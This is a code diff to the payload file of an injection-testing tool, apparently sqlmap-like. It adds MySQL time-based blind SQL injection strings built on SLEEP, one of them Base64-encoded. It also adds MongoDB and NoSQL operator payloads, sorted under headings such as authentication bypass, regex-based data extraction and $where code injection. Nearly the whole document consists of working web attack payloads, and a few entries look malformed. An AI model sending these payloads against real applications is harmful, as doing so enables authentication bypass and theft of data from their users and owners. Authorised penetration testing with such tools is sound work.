@@ -51,6 +51,11 @@ LENGTH_PAYLOADS = {
         "ASCII(SUBSTRING(COALESCE(LENGTH({query})::text,CHR(48))::text FROM {position} FOR 1))={char}",
         "ASCII(SUBSTRING(COALESCE(CAST(LENGTH({query})::text AS VARCHAR(10000))::text,CHR(32))::text FROM {position} FOR 1))={char}",
     ],
+    "NoSQL": {
+        "length": "[$regex]=.{1}",
+        "length1": "$regex]=.{3}",
+        "length2": "[$ne]=1",
+    },
 }
 
 DATA_EXTRACTION_PAYLOADS = {
@@ -74,6 +79,16 @@ DATA_EXTRACTION_PAYLOADS = {
         "no-cast": "ASCII(SUBSTRING({query}::text FROM {position} FOR 1))={char}",
         "isnull": "ASCII(SUBSTRING((COALESCE({query}::text,CHR(32)))::text FROM {position} FOR 1))={char}",
         "cast": "ASCII(SUBSTRING((COALESCE(CAST({query}::text AS VARCHAR(10000))::text,CHR(32)))::text FROM {position} FOR 1))={char}",
+    },
+    "NoSQL": {
+        "data": "[$ne]",
+        "data1": "[$regex]=a.{2}",
+        "data2": "[$regex]=b.{2}",
+        "data3": "[$regex]=m.{2}",
+        "data4": "[$regex]=md.{1}",
+        "data5": "[$regex]=mdp",
+        "data6": "[$regex]=m.*",
+        "data7": "[$regex]=md.*",
     },
 }
 
@@ -499,6 +514,132 @@ PAYLOADS = {
                 "vector": "0986=IF(([INFERENCE]),SLEEP([SLEEPTIME]),986)",
                 "dbms": "MySQL",
             },
+            {
+                "payload": "a' OR (SELECT 1 FROM (SELECT(SLEEP(2)))a)-- -",
+                "comments": [
+                    {"pref": " ", "suf": "--"},
+                    {"pref": "' ", "suf": "--"},
+                    {"pref": '" ', "suf": "--"},
+                    {"pref": ") ", "suf": "--"},
+                    {"pref": "') ", "suf": "--"},
+                    {"pref": '") ', "suf": "--"},
+                ],
+                "title": "MySQL time-based blind - Delays execution using SLEEP",
+                "vector": "a' OR (SELECT 1 FROM (SELECT(SLEEP([SLEEPTIME])))a)-- -",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)--+-",
+                "comments": [
+                    {"pref": " ", "suf": "--"},
+                    {"pref": "' ", "suf": "--"},
+                    {"pref": '" ', "suf": "--"},
+                    {"pref": ") ", "suf": "--"},
+                    {"pref": "') ", "suf": "--"},
+                    {"pref": '") ', "suf": "--"},
+                ],
+                "title": "MySQL time-based blind - Uses SLEEP to delay response",
+                "vector": "1'+AND+(SELECT+1+FROM+(SELECT(SLEEP([SLEEPTIME])))a)--+-",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1)+AND+(SELECT+1+FROM+(SELECT(SLEEP(3)))a)--+-",
+                "comments": [
+                    {"pref": " ", "suf": "--"},
+                    {"pref": "' ", "suf": "--"},
+                    {"pref": '" ', "suf": "--"},
+                    {"pref": ") ", "suf": "--"},
+                    {"pref": "') ", "suf": "--"},
+                    {"pref": '") ', "suf": "--"},
+                ],
+                "title": "MySQL time-based blind - Uses SLEEP to delay response",
+                "vector": "1)+AND+(SELECT+1+FROM+(SELECT(SLEEP([SLEEPTIME])))a)--+-",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "id+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)",
+                "comments": [
+                    {"pref": " ", "suf": "--"},
+                    {"pref": "' ", "suf": "--"},
+                    {"pref": '" ', "suf": "--"},
+                    {"pref": ") ", "suf": "--"},
+                    {"pref": "') ", "suf": "--"},
+                    {"pref": '") ', "suf": "--"},
+                ],
+                "title": "MySQL time-based blind - Uses SLEEP to delay response",
+                "vector": "id+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1+OR+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)--",
+                "comments": [
+                    {"pref": " ", "suf": "--"},
+                    {"pref": "' ", "suf": "--"},
+                    {"pref": '" ', "suf": "--"},
+                    {"pref": ") ", "suf": "--"},
+                    {"pref": "') ", "suf": "--"},
+                    {"pref": '") ', "suf": "--"},
+                ],
+                "title": "MySQL time-based blind - Uses SLEEP to delay response",
+                "vector": "1+OR+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)--",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1'{+}AND{+}(SELECT+1+FROM+(SELECT(SLEEP(0.5)))a)-{-}+{-}",
+                "comments": [
+                    {"pref": " ", "suf": "--"},
+                    {"pref": "' ", "suf": "--"},
+                    {"pref": '" ', "suf": "--"},
+                    {"pref": ") ", "suf": "--"},
+                    {"pref": "') ", "suf": "--"},
+                    {"pref": '") ', "suf": "--"},
+                ],
+                "title": "MySQL time-based blind - Uses SLEEP to delay response",
+                "vector": "1'{+}AND{+}(SELECT+1+FROM+(SELECT(SLEEP(0.5)))a)-{-}+{-}",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)",
+                "comments": [
+                    {"pref": " ", "suf": "--"},
+                    {"pref": "' ", "suf": "--"},
+                    {"pref": '" ', "suf": "--"},
+                    {"pref": ") ", "suf": "--"},
+                    {"pref": "') ", "suf": "--"},
+                    {"pref": '") ', "suf": "--"},
+                ],
+                "title": "MySQL time-based blind - Uses SLEEP to delay response",
+                "vector": "1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "LTEgT1IgU0xFRVAoMik=",  # Base64 for '-1 OR SLEEP(2)'
+                "comments": [
+                    {"pref": " ", "suf": "--"},
+                    {"pref": "' ", "suf": "--"},
+                    {"pref": '" ', "suf": "--"},
+                    {"pref": ") ", "suf": "--"},
+                    {"pref": "') ", "suf": "--"},
+                    {"pref": '") ', "suf": "--"},
+                ],
+                "title": "MySQL time-based blind - Base64 encoded SLEEP",
+                "vector": "LTEgT1IgU0xFRVAoMik=",
+                "dbms": "MySQL",
+            },
+            {
+                "payload": "1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)",
+                "comments": [
+                    {"pref": " ", "suf": "--"},
+                    {"pref": "' ", "suf": "--"},
+                    {"pref": '" ', "suf": "--"},
+                    {"pref": ") ", "suf": "--"},
+                    {"pref": "') ", "suf": "--"},
+                    {"pref": '") ', "suf": "--"},
+                ],
+                "title": "MySQL time-based blind - Uses SLEEP to delay response",
+                "vector": "1+AND+(SELECT+1+FROM+(SELECT(SLEEP(1)))a)",
+                "dbms": "MySQL",
+            }
         ],
         "error-based": [
             {
@@ -770,7 +911,7 @@ PAYLOADS = {
                 "comments": [
                     {"pref": " ", "suf": "--"},
                     {"pref": "' ", "suf": "--"},
-                    {"pref": '" ', " suf": "--"},
+                    {"pref": '" ', "suf": "--"},
                     {"pref": ") ", "suf": "--"},
                     {"pref": "') ", "suf": "--"},
                     {"pref": '") ', "suf": "--"},
@@ -1148,6 +1289,154 @@ PAYLOADS = {
             },
         ],
     },
+    "MongoDB": {
+    "boolean-based": [
+        {
+            "title": "MongoDB Boolean-based bypass with $ne",
+            "vector": "[$ne]=1",
+            "dbms": "MongoDB",
+        },
+        {
+            "title": "MongoDB Boolean-based bypass with $where tautology",
+            "vector": "{ $where: '1 == 1' }",
+            "dbms": "MongoDB",
+        },
+        {
+            "title": "MongoDB Boolean-based bypass with $exists",
+            "vector": "[$exists]=true",
+            "dbms": "MongoDB",
+        },
+    ],
+    "regex-based": [
+        {
+            "title": "MongoDB Regex-based length extraction",
+            "vector": "[$regex]=.{25}",
+            "dbms": "MongoDB",
+        },
+        {
+            "title": "MongoDB Regex-based prefix match",
+            "vector": "[$regex]=^adm",
+            "dbms": "MongoDB",
+        },
+        {
+            "title": "MongoDB Regex-based match any",
+            "vector": "[$regex]=.*",
+            "dbms": "MongoDB",
+        },
+    ],
+    "aggregation": [
+        {
+            "title": "MongoDB Aggregation-based lookup injection",
+            "vector": '''
+            [
+                {
+                    "$lookup": {
+                        "from": "users",
+                        "as": "result",
+                        "pipeline": [
+                            { "$match": { "field": { "$regex": "^.*" } } }
+                        ]
+                    }
+                }
+            ]
+            ''',
+            "dbms": "MongoDB",
+        },
+    ],
+    "time-based": [
+        {
+            "title": "MongoDB Time-based injection (sleep)",
+            "vector": "function() { var x = [INFERENCE]; sleep(5000); }",
+            "dbms": "MongoDB",
+        },
+    ],
+    "code-injection": [
+        {
+            "title": "MongoDB Code Injection with $where",
+            "vector": "{ $where: 'this.credits == this.debits' }",
+            "dbms": "MongoDB",
+        },
+        {
+            "title": "MongoDB Code Injection with $func",
+            "vector": '{"$func": "var_dump"}',
+            "dbms": "MongoDB",
+        },
+    ],
+    "blind-injection": [
+        {
+            "title": "MongoDB Blind Injection with regex length",
+            "vector": "[$regex]=.{25}",
+            "dbms": "MongoDB",
+        },
+        {
+            "title": "MongoDB Blind Injection with regex prefix",
+            "vector": "[$regex]=^adm",
+            "dbms": "MongoDB",
+        },
+    ],
+    "arithmetic-bypass": [
+        {
+            "title": "MongoDB Arithmetic Bypass with tautology",
+            "vector": "{ $where: '1 == 1' }",
+            "dbms": "MongoDB",
+        },
+        {
+            "title": "MongoDB Arithmetic Bypass with $gt",
+            "vector": "{ $gt: '' }",
+            "dbms": "MongoDB",
+        },
+        {
+            "title": "MongoDB Arithmetic Bypass with $nin",
+            "vector": "{ $nin: ['admin', 'test'] }",
+            "dbms": "MongoDB",
+        },
+    ],
+},
+"NoSQL": {
+    "extract-data": [
+        {
+            "title": "NoSQL Data Extraction with regex",
+            "vector": "[$regex]=.{3}",
+            "dbms": "NoSQL",
+        },
+        {
+            "title": "NoSQL Data Extraction with prefix",
+            "vector": "[$regex]=^m",
+            "dbms": "NoSQL",
+        },
+    ],
+    "authentication-bypass": [
+        {
+            "title": "NoSQL Authentication Bypass with $ne",
+            "vector": "[$ne]=1",
+            "dbms": "NoSQL",
+        },
+        {
+            "title": "NoSQL Authentication Bypass with $exists",
+            "vector": "[$exists]=true",
+            "dbms": "NoSQL",
+        },
+    ],
+    "operator-exploit": [
+        {
+            "title": "NoSQL Operator Exploit with $lt",
+            "vector": "[$lt]=s",
+            "dbms": "NoSQL",
+        },
+        {
+            "title": "NoSQL Operator Exploit with $gt",
+            "vector": "[$gt]=s",
+            "dbms": "NoSQL",
+        },
+    ],
+    "php-arbitrary-function-execution": [
+        {
+            "title": "NoSQL PHP Arbitrary Function Execution",
+            "vector": '{"$func": "var_dump"}',
+            "dbms": "NoSQL",
+        },
+    ],
+},
 }
 
 PAYLOADS_DBS_COUNT = {
